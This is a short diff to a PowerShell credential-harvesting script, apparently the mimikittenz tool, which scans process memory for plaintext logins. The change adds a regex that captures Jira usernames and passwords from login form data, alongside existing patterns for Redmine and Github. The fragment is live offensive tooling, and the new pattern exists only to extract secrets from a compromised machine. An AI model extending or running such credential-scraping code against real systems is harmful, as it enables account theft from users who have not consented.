@@ -515,9 +515,7 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 #Dev Related
 
     #Jira
-    
-
-
+    [mimikittenz.MemProcInspector]::AddRegex("JIRA","username=.{1,50}&password=.{1,50}&rememberMe")
     #Redmine
     [mimikittenz.MemProcInspector]::AddRegex("Redmine","username=.{1,50}&password=.{1,50}&login=Login")
     #Github
